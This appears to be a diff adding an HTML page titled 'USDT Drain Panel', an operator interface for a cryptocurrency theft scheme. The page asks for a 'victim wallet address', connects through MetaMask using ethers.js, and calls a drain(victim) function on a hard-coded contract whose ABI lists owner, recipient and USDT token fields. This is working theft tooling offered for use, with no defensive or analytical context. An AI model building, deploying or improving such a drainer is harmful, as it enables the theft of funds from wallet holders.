@@ -1,0 +1,77 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>USDT Drain Panel</title>
+</head>
+<body>
+  <h2>USDT Drain Panel</h2>
+  <input type="text" id="walletAddress" placeholder="Enter victim wallet address" size="50">
+  <button onclick="drain()">Drain</button>
+  <p id="status"></p>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
+  <script>
+    const contractAddress = "0xfB42A84FE8C95B7C0af0dfA634c5a496cAFf6676";
+    const abi = [
+      {
+        "inputs": [],
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+      },
+      {
+        "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
+        "name": "drain",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "owner",
+        "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "recipient",
+        "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "usdtToken",
+        "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
+        "stateMutability": "view",
+        "type": "function"
+      }
+    ];
+
+    async function drain() {
+      const status = document.getElementById("status");
+      const victim = document.getElementById("walletAddress").value;
+
+      if (!window.ethereum) {
+        status.innerText = "MetaMask not found.";
+        return;
+      }
+
+      try {
+        await ethereum.request({ method: "eth_requestAccounts" });
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const contract = new ethers.Contract(contractAddress, abi, signer);
+
+        const tx = await contract.drain(victim);
+        status.innerText = `Draining... Tx Hash: ${tx.hash}`;
+        await tx.wait();
+        status.innerText = "Drain complete.";
+      } catch (error) {
+        status.innerText = "Error: " + error.message;
+      }
+    }
+  </script>
+</body>
+</html>
